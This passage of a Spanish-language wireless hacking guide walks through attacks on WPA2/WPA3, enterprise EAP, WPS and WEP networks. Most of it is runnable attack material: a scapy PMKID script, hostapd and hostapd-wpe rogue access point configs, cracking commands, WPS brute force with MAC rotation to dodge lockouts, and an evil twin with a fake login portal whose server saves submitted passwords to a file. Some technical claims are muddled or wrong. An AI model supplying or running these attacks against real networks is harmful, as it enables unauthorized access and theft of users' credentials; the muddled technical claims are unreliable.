# Capturar PMKID del beacon (raro, pero existe)
tshark -r captura.pcap -Y "wlan.rsn.pmkid" -T fields -e wlan.rsn.pmkid

# Si aparece, lo atacás igual que el de M1
```

### PMKID Attack sin hcxdumptool (Manual)

Si querés entender qué pasa exactamente:

```bash
# 1. Mandar Association Request manual con scapy
python3 << 'EOF'
from scapy.all import *
import binascii

conf.iface = "wlan0mon"

# Paquete 802.11 Association Request
ap_mac = "aa:bb:cc:dd:ee:ff"
client_mac = "00:11:22:33:44:55"

# Dot11 header
dot11 = Dot11(
    type=0,        # Management
    subtype=0,     # Association Request
    addr1=ap_mac,
    addr2=client_mac,
    addr3=ap_mac
)

# Association Request body
assoc_req = Dot11AssoReq(cap="short-preamble+ESS", listen_interval=10)
# RSN Info Element con PMKID request
rsn = Dot11Elt(ID=48, info=b'\x01\x00' + b'\x00\x0f\xac\x02' + b'\x02\x00' +
               b'\x00\x0f\xac\x04' + b'\x01\x00' + b'\x00\x0f\xac\x02' + b'\x00\x00')

pkt = RadioTap() / dot11 / assoc_req / rsn

sendp(pkt, iface="wlan0mon", count=10, inter=0.1)
print("Association Requests enviados")
EOF

# 2. Ahora monitoreá si el AP responde con M1 + PMKID
# En aireplay-ng se ve como EAPOL-Key
```

---

## WPA3/SAE — Análisis Profundo

WPA3 trajo SAE (Simultaneous Authentication of Equals), que reemplaza el 4-way [handshake](../raw/w1f1-4tt4cks.md#handshake) con un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) que usa Dragonfly Key Exchange basado en Diffie-Hellman sobre grupos de curva elíptica o FFC (Finite Field [cryptography](../raw/crypt0-f0r-h4ck3rs.md)). Es más seguro contra ataques de [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario) offline... pero está lejos de ser perfecto.

### El Handshake SAE (Dragonfly) — Explicación Técnica

SAE usa un intercambio de claves Dragonfly que funciona así:

```
Fase 1: Compromiso (Commit)
Cliente                                          AP
  |                                               |
  | ---- (Commit) SAE Commit ------------------->|
  |      - Elemento escalar (r*s)
  |      - Elemento FFE (elemento de curva)
  |      - Grup ID (18 = ECC 256, 19 = ECC 384, 20 = ECC 521)
  |                                               |
  | <--- (Commit) SAE Commit --------------------|
  |      - Elemento escalar + FFE del AP          |
  |                                               |

Fase 2: Confirmación (Confirm)
  | ---- (Confirm) SAE Confirm ------------------>|
  |      - Confirmado (KCM + SendConfirmAck)      |
  |                                               |
  | <--- (Confirm) SAE Confirm -------------------|
  |      - Confirmado y SendConfirmAck            |
  |                                               |
Fase 3: 4-Way Handshake (con PMK derivada de SAE)
  | ---- (M1) ANonce --------------------------->|
  | <--- (M2) SNonce + MIC ----------------------|
  | ---- (M3) GTK + MIC ------------------------>|
  | <--- (M4) ACK -------------------------------|
```

La PMK se deriva de la clave secreta compartida establecida durante SAE. No hay intercambio de contraseña en claro. Cada intento de conexión usa un intercambio DH único, haciendo imposible el ataque offline de diccionario standard.

### Hunting-and-Pecking vs [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)-to-Element (H2E)

El método original de SAE es "hunting-and-pecking" (HAP), que encuentra un punto en la curva elíptica iterando y probando. Tiene dos problemas de seguridad graves:

1. **Side-channel por tiempo**: la cantidad de iteraciones depende de la contraseña, revelando información a un atacante que mide tiempos de respuesta.
2. **Variación par/impar**: revela un bit de información de la contraseña por intento.

```bash
# Dragonblood side-channel ataca esto:
# Mide tiempo de respuesta del AP durante SAE commit
python dragonblood_attack.py wlan0mon AA:BB:CC:DD:EE:FF --time-attack
```

**H2E (Hash-to-Element)** es la solución del IEEE 802.11-2020. Usa una función hash determinística para mapear la contraseña directamente a un punto de curva, eliminando la variación temporal:

```bash
# Verificar si un AP usa H2E o HAP
# Analizando los campos SAE en el beacon:
tshark -r captura.pcap -Y "wlan.sae" -T fields -e wlan.sae.group -e wlan.sae.password_id

# H2E tiene un campo "Password Identifier" distinto
# Hunting-and-pecking NO tiene ese campo
```

### WPA3 Transition Mode — Explotación

El modo transición permite que un AP ofrezca tanto WPA3 como [wpa2](../raw/w1f1-4tt4cks.md#wpa2) simultáneamente usando el mismo SSID. El AP anuncia ambas capacidades en el beacon:

```bash
# Detectar redes en modo transición
airodump-ng wlan0mon | grep "WPA3\|WPA2"
# Buscar SSID duplicados con distinto RSN

# Ver en Wireshark: dos conjuntos RSN en el beacon
# RSN 1: AKM = SAE (00-0F-AC:8)
# RSN 2: AKM = PSK (00-0F-AC:2)
```

El ataque de downgrade funciona porque el atacante configura un [evil twin](../raw/w1f1-4tt4cks.md#evil-twin) que SOLO anuncia WPA2:

```bash
# 1. Escaneá redes WPA3 transition mode
# 2. Cloná solo la parte WPA2
cat > hostapd-downgrade.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=RedWPA3
hw_mode=g
channel=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=password_incorrecta
EOF

# 3. El cliente intenta conectarse con WPA2 PSK
#    Como la passphrase es incorrecta, capturás handshake
# 4. El cliente manda la passphrase real en PMK
```

Mejor aún: configurás un Evil Twin con WPA2 y cuando el cliente se conecta, le pedís que se reconecte al WPA3 real (DoS intermitente) hasta capturar suficientes handshakes.

### SAE-PK (Public Key) — Introducción Técnica

SAE-PK agrega un par de claves pública/privada al SSID para prevenir Evil Twin. El AP firma el beacon con su clave privada, y el cliente verifica con la clave pública embebida en el SSID:

```
SSID = "RedWiFi" + base64(PublicKeyHash)
```

El SSID contiene un hash de la clave pública. El AP manda un elemento SAE-PK en el beacon con la firma. El cliente verifica y si la firma no coincide, no se conecta.

```bash
# Detectar redes con SAE-PK
tshark -r captura.pcap -Y "wlan.sae_pk" -T fields
# El beacon incluye "SAE-PK" en los RSN capabilities

# Ataque a SAE-PK:
# - Replay attack: si capturás un beacon firmado válido, lo podés retransmitir
# - Rollback attack: forzar al cliente a WPA3 sin SAE-PK
# - En implementaciones tempranas, el cliente no valida la firma correctamente
```

### SAE Commit/Confirm — Análisis de Paquetes

```bash
# Capturar SAE handshake completo
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_handshake wlan0mon

# Analizar con tshark
tshark -r sae_handshake-01.cap -Y "wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x01"

# Ver campos SAE Commit:
tshark -r sae_handshake-01.cap -Y "wlan.sae.commit" -T fields \
  -e wlan.sae.group \
  -e wlan.sae.scalar \
  -e wlan.sae.element \
  -e wlan.sae.anti_clogging_token

# Anti-Clogging Token: el AP puede pedir prueba de trabajo al cliente
# para evitar DoS. Si ves "Token" en el commit, el cliente resolvió PoW.
```

### Convertir SAE a [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)

```bash
# hcxdumptool captura SAE automáticamente
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1

# Extraer hashes WPA3 (modo 16100)
hcxpcapngtool -o hashes.16100 captura.pcapng

# Cracking WPA3 (mucho más lento que WPA2 por el DH)
hashcat -m 16100 hashes.16100 rockyou.txt

# Diferencia: WPA3 SAE es ~100x más lento de crackear que WPA2 PSK
# porque verificar cada contraseña requiere cálculos DH completos
hashcat -m 16100 -b  # Benchmark modo SAE
```

### WPA3-OWE (Opportunistic Wireless Encryption)

OWE está definido en RFC 8110 y es para [redes](../raw/r3d3s-f0nd4m3nt0s.md) abiertas (sin contraseña). Hace un intercambio DH para derivar una clave única por sesión.

```bash
# Detectar OWE
airodump-ng wlan0mon | grep "OWE"
# En Wireshark: AKM = OWE (00-0F-AC:18)

# Ataques a OWE:
# 1. Downgrade a open (el AP ofrece OWE + open transition mode)
# 2. Evil twin sin OWE
# 3. Passive sniffing de DH exchange (no sirve, es efímero)

# OWE Transition Mode:
# El beacon tiene dos SSID iguales, uno OWE y otro abierto
# El atacante bloquea el OWE y fuerza al cliente al abierto
```

### WPA3-Enterprise Suite-B

WPA3-Enterprise tiene dos niveles:
- **Suite-B-192**: (modo 192-bit) — [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-256, SHA-384, ECDHE-P384. Exige EAP-[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) con certificados de 192-bit.
- **Suite-B-128**: equivalente al WPA2-Enterprise pero con SAE en vez de PSK.

```bash
# Detectar nivel Suite-B
tshark -r captura.pcap -Y "wlan.rsn.akm.type == 9" -T fields
# AKM 9 = Suite-B-192
# AKM 8 = Suite-B-128
```

Los ataques a Suite-B son los mismos que a Enterprise genérico: rogue AP, relay de credenciales, pero el [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) extremo hace que el [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) offline sea inviable.


## WPA3-Enterprise (802.1X/EAP) — Ataque Detallado

[wpa2](../raw/w1f1-4tt4cks.md#wpa2)/WPA3-Enterprise usan autenticación 802.1X con un servidor RADIUS. Cada usuario tiene credenciales individuales. Hay múltiples métodos EAP, cada uno con sus propias vulnerabilidades.

### Cómo Funciona 802.1X (EAP sobre LAN)

```
Cliente                    AP (Autenticador)        Servidor RADIUS
  |                             |                        |
  | --- EAPOL-Start ---------->|                        |
  | <--- EAP-Request/Identity--|                        |
  | --- EAP-Response/Identity->| ----- RADIUS Access-Request (User-Name) ---->|
  |                             |                        |
  | <--- EAP-Request (método)--| <-- RADIUS Access-Challenge (EAP-Message) ---|
  |                             |                        |
  | --- EAP-Response --------->| ---- RADIUS Access-Request (EAP-Message) ---->|
  |                             |                        |
  | <--- EAP-Success ----------| <-- RADIUS Access-Accept --------------------|
  |                             |                        |
  | ---- 4-Way Handshake ----->|                        |
```

El AP actúa como "autenticador" (pasamanos), no ve las credenciales. El servidor RADIUS es el que decide si el cliente pasa o no.

### Tipos de EAP — Vulnerabilidades Específicas

#### EAP-MD5 (obsoleto, roto)

El más débil. Manda contraseña hasheada con MD5 y un challenge. Cualquier ataque de [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario) offline funciona instantáneo:

```bash
# Capturar EAP-MD5
tshark -r captura.pcap -Y "eap.type == 4" -T fields -e eap.md5.challenge -e eap.md5.response

# Cracking offline (no necesita servidor RADIUS falso)
# El challenge y response están en claro en el paquete
# MD5 es extremadamente rápido de atacar
hashcat -m 4800 md5_hash.txt rockyou.txt
```

**[vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) crítica**: EAP-MD5 no provee autenticación mutua. El cliente no autentica al servidor, permitiendo rogue RADIUS attacks directos.

#### EAP-GTC (Generic Token Card)

Manda la contraseña en **texto claro** dentro del paquete EAP. Usado para autenticación con tokens [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) SecurID, pero implementaciones berretas lo usan con contraseñas estáticas:

```bash
# Capturar EAP-GTC
tshark -r captura.pcap -Y "eap.type == 6" -T fields -e eap.value
# El campo "eap.value" contiene la contraseña en texto claro

# Con hostapd-wpe, se captura automáticamente
tail -f /tmp/hostapd-wpe.log | grep "GTC"
```

#### EAP-MSCHAPv2 (el más común en PEAP/TTLS)

Usa MS-CHAP-v2 dentro de un túnel [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls). El [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) MSCHAPv2 tiene debilidades criptográficas conocidas:

```bash
# hostapd-wpe captura las credenciales MSCHAPv2
# Formato: challenge + response + nombre de usuario

# Extraer con asleap
asleap -r captura.pcap -f wordlist.txt
# asleap usa el challenge y response para verificar contraseñas

# Formato de hash NETNTLMv1 (modo hashcat 5500)
$NETNTLM$CHALLENGE_HEX$RESPONSE_HEX$USERNAME

# Cracking con hashcat
hashcat -m 5500 ntlm_hashes.txt rockyou.txt
# Velocidad: ~10M contraseñas/segundo en GPU

# El punto débil de MSCHAPv2:
# Usa DES para derivar el response del challenge
# La contraseña se divide en 3 partes de 7 bytes cada una
# Cada parte se ataca por separado (ataque DES individual)
# Conoce la estructura: 3 hashes DES separados
```

**Ataque DES individual**: Si tenés el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) NETNTLM podés atacar cada tercio de la contraseña:

```bash
# Usar asleap con verificación acelerada
asleap -r captura.pcap -W rockyou.txt -v
```

#### EAP-TTLS (Tunneled TLS)

Crea un túnel TLS (el cliente verifica certificado del servidor) y dentro del túnel manda las credenciales con otro protocolo (generalmente MSCHAPv2 o PAP).

```bash
# Configurar hostapd-wpe con EAP-TTLS
# En hostapd-wpe.conf:
eap_user_file=/etc/hostapd-wpe.eap_users

# El archivo de usuarios define qué métodos aceptar:
cat /etc/hostapd-wpe.eap_users
# *     TTLS-MSCHAPv2 0
# *     TTLS-PAP 0
# *     TTLS-CHAP 0

# Si el cliente no verifica el certificado del servidor (común),
# el atacante captura usuario y hash MSCHAPv2

# Si el cliente usa TTLS-PAP, las credenciales viajan en texto claro
# dentro del túnel TLS. El servidor falso las ve sin descifrar:
# (el servidor falso es el que termina TLS)
```

#### EAP-PEAP (Protected EAP)

Similar a EAP-TTLS pero solo permite MSCHAPv2 dentro del túnel. La diferencia clave:

- PEAP usa un "inner method" (MSCHAPv2) dentro del túnel TLS
- El servidor (falso) termina TLS, así que ve el inner auth en claro

```bash
# Configurar PEAP en hostapd-wpe
# PEAP necesita certificado de servidor

# Ataque de relay PEAP:
# Podés relayar los paquetes EAP entre el cliente y un AP real
# El cliente cree que está hablando con el servidor legítimo

# Herramienta: eaphammer
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./eaphammer --cert-wizard  # Generar certificados

# Crear AP falso con EAP
./eaphammer -i wlan0mon --essid RedCorporativa --auth peap-mschapv2
```

#### EAP-TLS (Certificate-Based)

El método más seguro usa certificados de cliente Y de servidor. El cliente presenta un certificado firmado por una CA corporativa.

```bash
# hostapd-wpe con EAP-TLS acepta cualquier certificado
# El servidor falso pide el certificado del cliente
# y lo captura/registra

# Ataque: obtener certificado válido
# Si lográs que te den un cert válido (social engineering, empleado corrupto),
# podés autenticarte contra el AP real

# Ataque: EAP-TLS relay
# Interceptás la conexión y relayás los paquetes entre el cliente real
# y el AP real, autenticándote efectivamente como el cliente

# eaphammer soporta relay
./eaphammer -i wlan0mon --essid RedCorp --relay --auth tls
```

#### EAP-FAST (Flexible Authentication via Secure Tunneling)

Usa un PAC (Protected Access Credential) en vez de certificado:

```bash
# hostapd-wpe con EAP-FAST
# FAST pide el PAC del cliente
# Si el AP falso no tiene el PAC, usa "unauthenticated provisioning"
# y el cliente manda las credenciales en claro durante el provisioning

# Ataque al provisioning
# Cuando FAST hace "unauthenticated provisioning", el cliente
# se autentica con GTC (contraseña en texto) o MSCHAPv2
```

#### LEAP (Lightweight EAP — Cisco [legacy](../raw/l3g4cy-3nt3rpr1s3.md), completamente roto)

Protocolo propietario de Cisco, muy usado en deployments viejos. LEAP usa MSCHAPv1, que es vulnerable a:

```bash
# Capturar LEAP
tshark -r captura.pcap -Y "eap.type == 17"  # LEAP = type 17

# Ataque: LEAP usa MSCHAPv1 versión 1
# MSCHAPv1 manda 2 challenges: uno legítimo y uno duplicado
# Con asleap:
asleap -r captura.pcap

# LEAP es débil: con 3-4 desafíos-respuestas, se puede recuperar
# la contraseña (ataque de Diccionario + DES cracking)
```

### Configuración Completa de Hostapd-WPE (RADIUS Server Falso)

```bash
# Instalación
cd /opt
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
make

# Generar certificados (para PEAP/TTLS/EAP-TLS)
cd certs
./bootstrap
# Esto genera:
# - server.pem (certificado + clave privada del servidor falso)
# - ca.pem (CA falsa)
# - client.pem (opcional)

# Configuración completa
cd ..
cat > hostapd-wpe.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=Corp-WiFi
channel=6
hw_mode=g
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=hostapd-wpe.eap_users

# Configuración RADIUS
own_ip_addr=192.168.1.1
auth_server_addr=192.168.1.1
auth_server_port=1812
radius_server_addr=192.168.1.1
radius_server_port=1813

# Certificados
ca_cert=certs/ca.pem
server_cert=certs/server.pem
private_key=certs/server.key
private_key_passwd=whatever
dh_file=certs/dh.pem

# WPE specific
wpe_logfile=/tmp/hostapd-wpe.log
wpe_userfile=hostapd-wpe.users
EOF

# Configurar qué métodos EAP aceptar
cat > hostapd-wpe.eap_users << EOF
*     PEAP,TTLS,TLS,FAST,GTC 0
EOF

# Ejecutar
./hostapd-wpe hostapd-wpe.conf

# En otra terminal, monitorear credenciales capturadas
tail -f /tmp/hostapd-wpe.log
```

### Credenciales Capturadas — Análisis

Cuando hostapd-wpe captura una conexión, el log muestra:

```
mschapv2: username: jperez
mschapv2: challenge: 2a3b4c5d6e7f8a9b
mschapv2: response: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
mschapv2: ERROR: Passphrase 12345678 returned 9800 bytes
  Some say the challenge-response algorithm for MSChapV2 is broken

EAP-TLS: username: gmartinez
EAP-TLS: certificate received: /tmp/cert.pem
EAP-TLS: certificate subject: /CN=gmartinez/OU=IT

EAP-GTC: username: admin
EAP-GTC: password: super_secreto_123
```

### Ataques a RADIUS Shared Secret

El RADIUS shared secret se usa para firmar los paquetes RADIUS entre el AP y el servidor RADIUS. Si el shared secret es débil:

```bash
# RADIUS usa HMAC-MD5 con el shared secret
# Si capturás tráfico RADIUS (en la red cableada), podés atacar el shared secret

# Herramienta: radcrack
radcrack -r captura-radius.pcap -w wordlist.txt

# Analizar paquetes RADIUS
tshark -r captura-radius.pcap -Y "radius" -T fields \
  -e radius.code \
  -e radius.id \
  -e radius.authenticator

# Si el shared secret es vacío o "radius" (default común),
# podés forjar Access-Accept y Access-Reject
```

### EAP Downgrade Attacks

Forzás al cliente a usar un método EAP más débil interceptando la negociación:

```bash
# El AP manda EAP-Request proponiendo métodos:
# Priority: TLS (fuerte) > PEAP > TTLS > LEAP (débil)
# El cliente elige el más fuerte que soporta

# Ataque: modificás el EAP-Request del AP real para eliminar
# métodos fuertes, forzando al cliente a usar GTC o MD5

# Con bettercap + script:
# Interceptar EAP-Request/Identity
# Reemplazar lista de métodos aceptados
# Forzar al cliente a elegir GTC (contraseña en claro)
```

### 802.1X Bypass Techniques

En [redes](../raw/r3d3s-f0nd4m3nt0s.md) 802.1X, antes de autenticarse solo se permite tráfico EAPOL. Después de autenticarse, el [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches) desbloquea el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos). Técnicas de bypass:

```bash
# 1. MAC authentication bypass (MAB)
# Algunos switches tienen MAB como fallback para dispositivos sin 802.1X
# Clonás la MAC de un dispositivo autorizado

# 2. EAPOL relay
# Conectás un dispositivo entre el cliente y el switch
# Relayás los paquetes EAPOL sin modificar
# Una vez autenticado, tenés acceso a la red

# 3. 802.1X timeout attack
# En algunos switches, si el cliente no responde al EAP-Request,
# el switch abre el puerto después de un timeout

# 4. Voice VLAN bypass
# Los teléfonos VoIP tienen VLAN especial y bypass de 802.1X
# Si conectás un dispositivo a un phone jack, podés eludir 802.1X

# Herramienta: eaphammer tiene modo "bypass"
./eaphammer --bypass -i eth0
```

### Ataques Offline a EAP-MSCHAPv2 con [john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)

```bash
# Convertir log de hostapd-wpe a formato john
# Formato: usuario:$NETNTLM$challenge$response

cat /tmp/hostapd-wpe.log | grep "mschapv2" | awk -F: '
/challenge:/ { challenge=$2 }
/response:/ { response=$2 }
/username:/ { user=$2 }
' > netntlm_hashes.txt

# Atacar con john
john --format=netntlmv2 --wordlist=rockyou.txt netntlm_hashes.txt
```

### Ataque de [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) Débil en EAP-TLS

Cuando un cliente presenta un certificado EAP-TLS, podés analizar su fortaleza:

```bash
# Hostapd-WPE guarda el certificado del cliente
# Extraer info del cert
openssl x509 -in /tmp/cert.pem -text -noout

# Ver:
# - Algoritmo de firma (SHA1WithRSA es débil)
# - Tamaño de clave (1024-bit es débil)
# - Fecha de expiración
# - Subject/issuer (información corporativa)

# Ataque: si el cert usa SHA1, podés generar una colisión
# Ataque: si el cert es 1024-bit RSA, podés factorizarlo
# (técnicamente posible con recursos significativos)

# Clonar certificado para acceso no autorizado
openssl pkcs12 -export -in cert.pem -inkey key.pem -out cert.p12
# Usar en otro dispositivo para autenticarse como el usuario original
```

---

## [wpa2](../raw/w1f1-4tt4cks.md#wpa2)-Enterprise Attack

WPA2-Enterprise (usado en empresas, universidades) no usa PSK. Cada usuario tiene sus propias credenciales (usuario + contraseña) que se validan contra un servidor RADIUS.

### Rogue RADIUS Attack

```bash
# hostapd-wpe (WiFi Protected Enterprise)
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
make
cd hostapd-wpe/certs
./bootstrap  # generar certificados
cd ..

# Configurar
cat > hostapd-wpe.conf << EOF
interface=wlan0mon
ssid=Empresa-WiFi
channel=6
auth_server_port=1812
auth_server_addr=127.0.0.1
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=hostapd-wpe.eap_users
EOF

# Ejecutar
./hostapd-wpe hostapd-wpe.conf
```

### Capturar Credenciales EAP

Cuando un cliente se conecta al fake AP, el servidor RADIUS falso captura:

- EAP-MSCHAPv2: usuario + [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) (crackeable con [john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)/[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat))
- EAP-TTLS: usuario + contraseña
- PEAP: usuario + contraseña (si configurás MSCHAPv2)

```bash
# Ver credenciales capturadas
tail -f /tmp/hostapd-wpe.log

# Extraer hashes de EAP-MSCHAPv2
asleap -r captura.pcap
asleap -C 2a:bc:de:... -R 12:34:56:... -W wordlist.txt
```

### Modo de hashcat para EAP MSCHAPv2

```bash
# Convertir a formato hashcat
# Formato: $NETNTLM$CHALLENGE$HASH
hashcat -m 5500 eap_hash.txt rockyou.txt
```

### Defensa contra Rogue AP Enterprise

- Validar certificados del servidor RADIUS (en PEAP/TTLS)
- Usar EAP-[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) (certificados de cliente)
- Usar autenticación 802.1X con NAC

---

## [wps](../raw/w1f1-4tt4cks.md#wps) Attack

WPS ([wifi](../raw/w1f1-4tt4cks.md) Protected Setup) fue diseñado para simplificar la conexión, pero es un desastre de seguridad.

### Pixie Dust Attack

El ataque más devastador: aprovecha que algunos routers generan números aleatorios predecibles (o directamente constantes) durante el intercambio WPS.

```bash
# Escanear redes con WPS
wash -i wlan0mon
# Buscar: WPS Locked? No, y Lck = 0

# Pixie Dust (con reaver)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# Pixie Dust con pixiewps (más rápido)
pixiewps --e-s1=... --e-s2=... --pk=... --pke=... --auth=...
```

### PIN Brute Force

WPS PIN tiene 8 dígitos. El último es checksum, y se verifica en dos mitades separadas (primeros 4 + últimos 3). Eso da solo 11.000 combinaciones posibles en lugar de 10.000.000.

```bash
# Reaver con PIN (ataque en línea)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -L -N

# -L: no intentar asociarse (evita locks)
# -N: no enviar NACKs

# Aumentar timeout
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -t 10 -d 0

# Con bully (alternativa)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
```

### ¿Qué routers son vulnerables?

| [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) | Pixie Dust | PIN tarda |
|--------|:---:|:---:|
| TP-Link viejos | ✅ | Segundos |
| D-Link viejos | ✅ | Segundos |
| Movistar/Fibertel | A veces | Minutos |
| Linksys | ❌ | Horas |
| Router modernos (2022+) | ❌ | Con lockout |

### WPS Lockout

Muchos routers bloquean WPS después de 3-5 intentos fallidos (por 1-5 minutos). Estrategias:

1. **MAC address rotation**: cambiar MAC después de cada intento para evitar el lockout
2. **Slow attack**: esperar 30-60 segundos entre intentos
3. **Pixie Dust**: si funciona, no hay lockout porque no necesitás intentos

```bash
# Cambiar MAC entre intentos
ifconfig wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up
```

---

## WEP Attacks ([redes](../raw/r3d3s-f0nd4m3nt0s.md) Legado)

WEP está completamente roto. Solo deberías verlo en entornos industriales viejos o hardware [legacy](../raw/l3g4cy-3nt3rpr1s3.md). Pero si te encontrás uno:

```bash
# Capturar paquetes
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Inyectar ARP (acelera la captura de IVs)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon

# O fake auth + ARP request
aireplay-ng -1 0 -e RED_WEP -a AA:BB:CC:DD:EE:FF wlan0mon
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crackear WEP (necesitás ~20,000 IVs para 64-bit, ~50,000 para 128-bit)
aircrack-ng wep_capture-01.cap

# Con aircrack-ng específico
aircrack-ng -b AA:BB:CC:DD:EE:FF wep_capture-01.cap

# Con hashcat (WEP es modo 12000)
hashcat -m 12000 wep_capture.hccapx rockyou.txt
```

---

## Ataques Avanzados

### KARMA Attack

Aprovecha que los dispositivos (teléfonos, laptops) mandan **Probe Requests** con los nombres de [redes](../raw/r3d3s-f0nd4m3nt0s.md) [wifi](../raw/w1f1-4tt4cks.md) que conocen. El atacante responde a TODOS esos probes diciendo "sí, yo soy esa [red](../raw/r3d3s-f0nd4m3nt0s.md)".

```bash
# Con bettercap
sudo bettercap -eval "set wifi.ap.ssid karma; wifi.recon on; wifi.ap on"

# Con hostapd-karma
# hostapd modificado que responde a cualquier SSID
git clone https://github.com/ivanlei/hostapd-karma
cd hostapd-karma
make
# Configurar y ejecutar...
```

### Known Beacon Attack

Similar al KARMA pero más pasivo. El atacante escucha probe requests y después transmite beacons para esas redes específicas, haciendo que el dispositivo intente conectarse.

```bash
# Escuchar probes
airodump-ng wlan0mon --probe

# Ver probes específicos
tshark -r captura.pcap -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.ssid

# Después transmitir beacons con mdk4 para esos SSIDs
# Primero extraer SSIDs de probes, después:
mdk4 wlan0mon b -c 6 -f ssids.txt
```

### AP-less Deauth (Sin Access Point)

Podés mandar deauth aunque la red objetivo no esté al alcance:

```bash
# Si tenés la MAC del AP de antes, mandás deauth igual
# El paquete se envía, pero el canal tiene que coincidir
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Client Probe Sniffing

```bash
# Capturar probes de clientes cercanos
airodump-ng wlan0mon --probe

# Mejor con kismet
kismet -c wlan0mon
# Muestra "Probe Networks" detectadas

# Con tshark + scripting
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.sa -e wlan.ssid
```

---

## [evil twin](../raw/w1f1-4tt4cks.md#evil-twin) Attack

Creás un Access Point falso con el mismo SSID que uno legítimo. Los clientes se conectan al falso y vos capturás todo.

### Con hostapd (manual)

```bash
# 1. Configurar hostapd
cat > hostapd.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=WiFi-Legitimo
hw_mode=g
channel=6
wpa=2
wpa_passphrase=contraseña_falsa
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# 2. Configurar DHCP + DNS (dnsmasq)
cat > dnsmasq.conf << EOF
interface=wlan0mon
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF

# 3. Configurar iptables (redirección)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# 4. Portal cautivo falso (página de login)
mkdir portal
cat > portal/index.html << EOF
<!DOCTYPE html>
<html><head><title>WiFi</title></head>
<body>
<h2>Actualización de Red</h2>
<form method="POST" action="/login">
  Usuario: <input type="text" name="user"><br>
  Contraseña: <input type="password" name="pass"><br>
  <input type="submit" value="Conectar">
</form>
</body></html>
EOF

# 5. Servir portal
python3 -c "
import http.server, os, urllib.parse
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode()
        with open('/tmp/creds.txt', 'a') as f:
            f.write(body + '\n')
        self.send_response(302)
        self.send_header('Location', 'https://google.com')
        self.end_headers()
    def log_message(self, fmt, *args):
        pass
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
" &

# 6. Iniciar
hostapd hostapd.conf &
dnsmasq -C dnsmasq.conf
```

### Con [bettercap](../raw/m1tm-m0b1l3.md#bettercap) (automático)

```bash
# Bettercap lo hace todo solo
sudo bettercap -eval "
set wifi.ap.ssid WiFi-Legitimo;
set wifi.ap.channel 6;
set wifi.ap.password contraseña_falsa;
set wifi.ap.karma true;
wifi.ap on;
http.proxy on;
http.proxy.script /path/to/capture.js;
"

# Capturar credenciales HTTP/HTTPS (SSLstrip)
sudo bettercap -eval "
set arp.spoof.targets 192.168.1.0/24;
arp.spoof on;
net.sniff on;
"

# Capturar handshake (para WPA)
sudo bettercap -eval "
set wifi.ap.ssid WiFi-Legitimo;
set wifi.handshakes.file /tmp/;
wifi.ap on;
"
```

### [sslstrip](../raw/m1tm-m0b1l3.md#sslstrip) con Evil Twin

```bash
# Redirigir HTTPS a HTTP
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
